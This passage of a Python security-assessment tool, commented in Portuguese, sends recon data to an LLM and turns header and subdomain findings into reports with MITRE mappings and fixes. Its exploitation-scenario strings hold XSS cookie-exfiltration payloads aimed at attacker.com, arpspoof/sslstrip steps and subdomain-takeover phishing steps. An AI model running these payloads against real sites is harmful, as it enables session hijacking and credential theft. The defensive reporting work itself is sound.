            f"AI_PROVIDER inválido: '{provider}'. Use 'groq', 'openrouter' ou 'ollama'."
        )


# ── Parse e validação ─────────────────────────────────────────────────────

def parse_response(raw: str) -> dict:
    cleaned = raw.strip()
    try:
        return _validate_output(json.loads(cleaned), raw)
    except json.JSONDecodeError:
        pass
    match = re.search(r"```(?:json)?\s*([\s\S]*?)```", cleaned)
    if match:
        try:
            return _validate_output(json.loads(match.group(1).strip()), raw)
        except json.JSONDecodeError:
            pass
    match = re.search(r"\{[\s\S]*\}", cleaned)
    if match:
        try:
            return _validate_output(json.loads(match.group()), raw)
        except json.JSONDecodeError:
            pass
    logger.error(f"[ai_analyst] Parse falhou. Raw:\n{raw[:400]}")
    return _error_output("Modelo retornou formato inválido — JSON não encontrado", raw)


def _validate_output(data: dict, raw: str) -> dict:
    try:
        return AnalysisOutput(**data).model_dump()
    except ValidationError as e:
        logger.warning(f"[ai_analyst] Pydantic: {e.error_count()} erro(s) — usando dados parciais")
        data.setdefault("priority_level",    "INDETERMINADO")
        data.setdefault("executive_summary", "Resumo não gerado pelo modelo.")
        data.setdefault("findings",          [])
        data.setdefault("threat_hypotheses", [])
        data.setdefault("recommendations",   [])
        data["_validation_warnings"] = [str(err["msg"]) for err in e.errors()]
        return data


# ── Persistência ──────────────────────────────────────────────────────────

def save_analysis(target: str, analysis: dict) -> str:
    OUTPUT_DIR.mkdir(exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_name = target.replace(".", "_").replace("/", "-").replace(":", "-")
    filename  = OUTPUT_DIR / f"{safe_name}_{timestamp}_ai_analysis.json"
    filename.write_text(json.dumps(analysis, indent=2, ensure_ascii=False), encoding="utf-8")
    logger.info(f"[ai_analyst] Análise salva: {filename}")
    return str(filename)


# ── Conversores determinísticos ──────────────────────────────────────────

def _convert_header_findings(header_data: dict) -> list[dict]:
    if not header_data or header_data.get("error"):
        return []
    raw_findings: list[dict] = header_data.get("findings", [])
    if not raw_findings:
        return []

    converted: list[dict] = []
    f_id = 1

    tls_group = [f for f in raw_findings if f.get("type") in ("no_ssl", "missing_strict_transport_security")]
    if tls_group:
        evidences = [f.get("evidence", "") for f in tls_group if f.get("evidence")]
        converted.append({
            "id": f"H-{f_id:03d}", "title": "HTTPS indisponivel e HSTS ausente",
            "severity": "HIGH", "category": "Transport Security",
            "mitre_id": "T1557", "mitre_name": "Adversary-in-the-Middle",
            "mitre_attack": {"technique_id": "T1557", "technique": "Adversary-in-the-Middle"},
            "description": "Servidor responde apenas em HTTP. Todo trafego transitado em texto claro. HSTS ausente impede que browsers forcam HTTPS, habilitando downgrade de protocolo.",
            "evidence": " | ".join(evidences[:2]),
            "exploitation": {"complexity": "BAIXA", "realistic_scenario": "1. Atacante em rede intermediaria executa: arpspoof -i eth0 -t <vitima> <gateway>. 2. sslstrip intercepta requisicoes HTTPS e as serve como HTTP. 3. Credenciais e cookies de sessao capturados em texto claro com Wireshark."},
            "recommendation": {"priority": "HIGH", "action": "Configurar TLS valido e adicionar: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload", "verification": "curl -I http://alvo | grep -i strict-transport"},
            "_source": "header_agent",
        })
        f_id += 1

    protection_types = {"missing_content_security_policy", "missing_x_frame_options", "missing_permissions_policy", "missing_x_content_type_options", "missing_referrer_policy"}
    protection_group = [f for f in raw_findings if f.get("type") in protection_types]
    if protection_group:
        missing_names = [f.get("title", "").replace("Header ", "").replace(" ausente", "") for f in protection_group]
        converted.append({
            "id": f"H-{f_id:03d}", "title": f"Headers de protecao ausentes: {', '.join(missing_names[:3])}",
            "severity": "MEDIUM" if len(protection_group) >= 2 else "LOW", "category": "Security Headers",
            "mitre_id": "T1185", "mitre_name": "Browser Session Hijacking",
            "mitre_attack": {"technique_id": "T1185", "technique": "Browser Session Hijacking"},
            "description": f"Ausencia simultanea de {len(protection_group)} headers de protecao. CSP ausente habilita XSS. X-Frame-Options ausente habilita clickjacking. Permissions-Policy ausente remove controle sobre APIs do browser.",
            "evidence": f"{len(protection_group)} headers ausentes: {', '.join(missing_names)}",
            "exploitation": {"complexity": "MEDIA", "realistic_scenario": "1. Atacante encontra input refletido na aplicacao. 2. Injeta: <script>fetch('https://attacker.com/?c='+document.cookie)</script>. 3. Sem CSP, script executa inline e exfiltra cookie de sessao. 4. Session hijacking com token roubado."},
            "recommendation": {"priority": "MEDIUM", "action": "Adicionar: Content-Security-Policy: default-src self; X-Frame-Options: DENY; Permissions-Policy: geolocation=(), microphone=(), camera=()", "verification": "curl -I http://alvo | grep -iE 'content-security|x-frame|permissions'"},
            "_source": "header_agent",
        })
        f_id += 1

    leakage_group = [f for f in raw_findings if f.get("type", "").startswith("info_leak_")]
    if leakage_group:
        evidences = [f.get("evidence", "") for f in leakage_group if f.get("evidence")]
        converted.append({
            "id": f"H-{f_id:03d}", "title": "Information leakage via headers HTTP",
            "severity": "LOW", "category": "Information Disclosure",
            "mitre_id": "T1592.002", "mitre_name": "Gather Victim Host Information: Software",
            "mitre_attack": {"technique_id": "T1592.002", "technique": "Gather Victim Host Information: Software"},
            "description": "Headers HTTP revelam versao do servidor e stack de backend. Reduz esforco de reconhecimento — atacante usa versao exposta para buscar CVEs especificos sem fingerprinting ativo.",
            "evidence": " | ".join(evidences[:3]),
            "exploitation": {"complexity": "TRIVIAL", "realistic_scenario": "1. curl -I http://alvo captura headers. 2. Server/X-Powered-By revela tecnologia e versao. 3. Busca CVEs em vulners.com ou NVD para a versao especifica. 4. Prioriza exploits publicos disponiveis."},
            "recommendation": {"priority": "LOW", "action": "Remover headers: ServerTokens Prod (Apache) | server_tokens off (Nginx)", "verification": "curl -I http://alvo | grep -iE 'server|x-powered'"},
            "_source": "header_agent",
        })
        f_id += 1

    cookie_types = {"cookie_no_secure", "cookie_no_httponly", "cookie_no_samesite"}
    cookie_group = [f for f in raw_findings if f.get("type") in cookie_types]
    if cookie_group:
        missing_flags = []
        if any(f.get("type") == "cookie_no_secure"   for f in cookie_group): missing_flags.append("Secure")
        if any(f.get("type") == "cookie_no_httponly" for f in cookie_group): missing_flags.append("HttpOnly")
        if any(f.get("type") == "cookie_no_samesite" for f in cookie_group): missing_flags.append("SameSite")
        converted.append({
            "id": f"H-{f_id:03d}", "title": f"Cookies sem flags de seguranca: {', '.join(missing_flags)}",
            "severity": "MEDIUM", "category": "Session Security",
            "mitre_id": "T1185", "mitre_name": "Browser Session Hijacking",
            "mitre_attack": {"technique_id": "T1185", "technique": "Browser Session Hijacking"},
            "description": f"Cookies sem flags {', '.join(missing_flags)}. Sem HttpOnly: cookie acessivel via JS. Sem Secure: transmitido em HTTP. Sem SameSite: vulneravel a CSRF.",
            "evidence": cookie_group[0].get("evidence", "")[:200] if cookie_group else "",
            "exploitation": {"complexity": "BAIXA", "realistic_scenario": "1. XSS via input: <script>new Image().src='https://attacker.com/?c='+document.cookie</script>. 2. Sem HttpOnly, document.cookie retorna session token. 3. curl -H 'Cookie: session=<token>' http://alvo/dashboard — acesso autenticado."},
            "recommendation": {"priority": "MEDIUM", "action": "Set-Cookie: session=<valor>; Secure; HttpOnly; SameSite=Strict", "verification": "curl -I http://alvo | grep -i set-cookie"},
            "_source": "header_agent",
        })
        f_id += 1

    cors_finding = next((f for f in raw_findings if f.get("type") == "cors_wildcard"), None)
    if cors_finding:
        converted.append({
            "id": f"H-{f_id:03d}", "title": "CORS configurado com wildcard (*)",
            "severity": "MEDIUM", "category": "API Security",
            "mitre_id": "T1190", "mitre_name": "Exploit Public-Facing Application",
            "mitre_attack": {"technique_id": "T1190", "technique": "Exploit Public-Facing Application"},
            "description": "Access-Control-Allow-Origin: * permite que qualquer origem acesse recursos da API. Em endpoints autenticados, site malicioso pode ler dados da resposta cross-origin.",
            "evidence": cors_finding.get("evidence", ""),
            "exploitation": {"complexity": "BAIXA", "realistic_scenario": "1. Vitima acessa site malicioso autenticada na aplicacao alvo. 2. Script executa: fetch('https://alvo/api/user', {credentials:'include'}). 3. CORS wildcard permite leitura da resposta com dados do perfil. 4. Dados exfiltrados para C2."},
            "recommendation": {"priority": "MEDIUM", "action": "Restringir: Access-Control-Allow-Origin: https://seudominio.com", "verification": "curl -H 'Origin: https://evil.com' -I http://alvo/api | grep -i access-control"},
            "_source": "subdomain_agent",
        })
        f_id += 1

    logger.info(f"[ai_analyst] Header findings pre-convertidos: {len(converted)} grupos")
    return converted


def _convert_subdomain_findings(subdomain_data: dict) -> list[dict]:
    if not subdomain_data or subdomain_data.get("error"):
        return []
    candidates = subdomain_data.get("takeover_candidates", [])
    if not candidates:
        return []
    converted: list[dict] = []
    for i, tc in enumerate(candidates, 1):
        converted.append({
            "id": f"S-{i:03d}", "title": f"Subdomain takeover — {tc.get('name')}",
            "severity": "CRITICAL", "category": "Subdomain Takeover",
            "mitre_id": "T1584.001", "mitre_name": "Compromise Infrastructure: Domains",
            "mitre_attack": {"technique_id": "T1584.001", "technique": "Compromise Infrastructure: Domains"},
            "description": f"Subdominio {tc.get('name')} tem CNAME apontando para {tc.get('cname')} ({tc.get('takeover_service')}), recurso nao reivindicado. Atacante pode registrar o recurso e controlar conteudo servido sob o dominio legitimo.",
            "evidence": f"CNAME: {tc.get('name')} -> {tc.get('cname')} | Servico: {tc.get('takeover_service')}",
            "exploitation": {"complexity": "TRIVIAL", "realistic_scenario": f"1. Confirmar CNAME: dig CNAME {tc.get('name')}. 2. Registrar conta no servico ({tc.get('takeover_service')}) e reivindicar o nome. 3. Hospedar pagina de phishing sob dominio legitimo. 4. Vitimas confiam na URL — credenciais coletadas."},
            "recommendation": {"priority": "CRITICAL", "action": f"Remover CNAME de {tc.get('name')} imediatamente ou reivindicar o recurso", "verification": f"dig CNAME {tc.get('name')} deve retornar NXDOMAIN"},
            "_source": "subdomain_agent",
        })
    logger.info(f"[ai_analyst] Takeover findings pre-convertidos: {len(converted)}")
    return converted


def _merge_findings(llm_findings: list[dict], confirmed_findings: list[dict]) -> list[dict]:
    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    confirmed_keys: set[str] = set()
    for f in confirmed_findings:
        confirmed_keys.add(f"{f.get('mitre_id', '')}:{f.get('category', '')}")
    filtered_llm: list[dict] = []
    for f in llm_findings:
        mitre = f.get("mitre_attack") or {}
        mid   = (mitre.get("technique_id") if isinstance(mitre, dict) else "") or f.get("mitre_id", "")
        if f"{mid}:{f.get('category', '')}" not in confirmed_keys:
            filtered_llm.append(f)
    merged = confirmed_findings + filtered_llm
    merged.sort(key=lambda x: severity_order.get(x.get("severity", "INFO"), 4))
    logger.info(
        f"[ai_analyst] Merge: {len(confirmed_findings)} confirmados + "
        f"{len(filtered_llm)} LLM (descartados: {len(llm_findings) - len(filtered_llm)}) = {len(merged)} total"
    )
    return merged


# ── Entry point ───────────────────────────────────────────────────────────

def run(
    collected_data  : dict,
    validation      : Optional[dict] = None,
    shodan_data     : Optional[dict] = None,
    correlator_data : Optional[dict] = None,
    enrichment_data : Optional[dict] = None,
    subdomain_data  : Optional[dict] = None,
    header_data     : Optional[dict] = None,
) -> dict:
    is_ip  = collected_data.get("is_ip", False)
    target = collected_data.get("ip") if is_ip else collected_data.get("domain", "desconhecido")
    if not target:
        target = "desconhecido"

    logger.info(f"[ai_analyst] Iniciando análise para: {target}")

    provider      = _get_provider()
    skills        = load_skills()
    memory        = load_memory()
    system_prompt = build_system_prompt(skills, format_memory(memory))

    context_parts: list[str] = [
        f"ALVO: {target}",
        "",
        "## DADOS WHOIS E DNS",
        json.dumps(collected_data, indent=2, ensure_ascii=False),
    ]

    if validation:
        context_parts += [
            "", "## VALIDAÇÃO",
            json.dumps(validation, indent=2, ensure_ascii=False),
        ]

    if shodan_data and "error" not in shodan_data:
        context_parts += [
            "", "## INFRAESTRUTURA (portas e serviços)",
            json.dumps(shodan_data, indent=2, ensure_ascii=False),
        ]

    if correlator_data and "error" not in correlator_data:
        context_parts += [
            "", "## CORRELAÇÃO ENTRE ALVOS",
            json.dumps(correlator_data, indent=2, ensure_ascii=False),
        ]

    if enrichment_data and "error" not in enrichment_data:
        context_parts += _build_enrichment_block(enrichment_data, provider=provider)

    if subdomain_data and not subdomain_data.get("error"):
        context_parts += _build_subdomain_block(subdomain_data)

    if header_data and not header_data.get("error"):
        context_parts += _build_header_block(header_data)

    context_parts.append(
        _build_analysis_instruction(enrichment_data, subdomain_data, header_data)
    )

    data_context = "\n".join(context_parts)

    # ── Pre-truncamento por provider ──────────────────────────────────────
    if provider == "groq":
        _C2T_PRE          = _GROQ_CHARS_PER_TOKEN
        _system_tok       = int(len(system_prompt) / _C2T_PRE)
        _input_budget_pre = _GROQ_FREE_TPM - _GROQ_MAX_OUTPUT_TOKENS
        _data_budget_pre  = max(500, _input_budget_pre - _system_tok)
        _data_chars_pre   = int(_data_budget_pre * _C2T_PRE)

        if len(data_context) > _data_chars_pre:
            _orig = len(data_context)
            data_context = data_context[:_data_chars_pre] + "\n...[contexto truncado — limite de tokens]"
            logger.warning(
                f"[ai_analyst] Pre-truncamento Groq (system={_system_tok} tok, "
                f"data_budget={_data_budget_pre} tok): {_orig} → {_data_chars_pre} chars"
            )

    elif provider == "openrouter":
        total_chars = len(system_prompt) + len(data_context)
        total_tokens_est = int(total_chars / _GROQ_CHARS_PER_TOKEN)
        logger.info(
            f"[ai_analyst] OpenRouter — contexto total: {total_chars:,} chars "
            f"(~{total_tokens_est:,} tokens) | Limite Nemotron: 262K tokens"
        )
        if len(data_context) > _OPENROUTER_MAX_CONTEXT_CHARS:
            _orig = len(data_context)
            data_context = data_context[:_OPENROUTER_MAX_CONTEXT_CHARS] + "\n...[truncado — safety net]"
            logger.warning(
                f"[ai_analyst] Safety net OpenRouter: {_orig} → {_OPENROUTER_MAX_CONTEXT_CHARS} chars"
            )

    else:
        if len(data_context) > _OLLAMA_MAX_CONTEXT_CHARS:
            _orig = len(data_context)
            data_context = data_context[:_OLLAMA_MAX_CONTEXT_CHARS] + "\n...[contexto truncado — limite atingido]"
            logger.warning(f"[ai_analyst] Safety net Ollama: {_orig} → {_OLLAMA_MAX_CONTEXT_CHARS} chars")

    logger.debug(f"[ai_analyst] Tamanho do contexto (data): {len(data_context)} chars")

    try:
        raw_response = call_model(system_prompt, data_context)
    except Exception as e:
        logger.error(f"[ai_analyst] Todos os providers falharam: {e}")
        analysis = _error_output(f"Todos os providers falharam: {e}")
        analysis.update({
            "target"     : target,
            "analyzed_at": datetime.now().isoformat(),
            "provider"   : provider,
            "model"      : os.getenv("AI_MODEL", "llama-3.3-70b-versatile"),
        })
        analysis["saved_to"] = save_analysis(target, analysis)
        return analysis

    analysis = parse_response(raw_response)

    confirmed_findings = (
        _convert_header_findings(header_data)
        + _convert_subdomain_findings(subdomain_data)
    )
    if confirmed_findings:
        llm_findings         = analysis.get("findings", [])
        analysis["findings"] = _merge_findings(llm_findings, confirmed_findings)

    analysis.update({
        "target"     : target,
        "analyzed_at": datetime.now().isoformat(),
        "provider"   : provider,
        "model"      : os.getenv("AI_MODEL", "llama-3.3-70b-versatile"),
    })
    analysis["saved_to"] = save_analysis(target, analysis)

    exec_s = analysis.get("executive_summary", {})
    resolved_priority = (
        exec_s.get("risk_level") if isinstance(exec_s, dict) else None
    ) or analysis.get("priority_level", "?")

    logger.info(
        f"[ai_analyst] Concluído — {analysis['provider']} | "
        f"Prioridade: {resolved_priority} | "
        f"Achados: {len(analysis.get('findings', []))}"
    )
    return analysis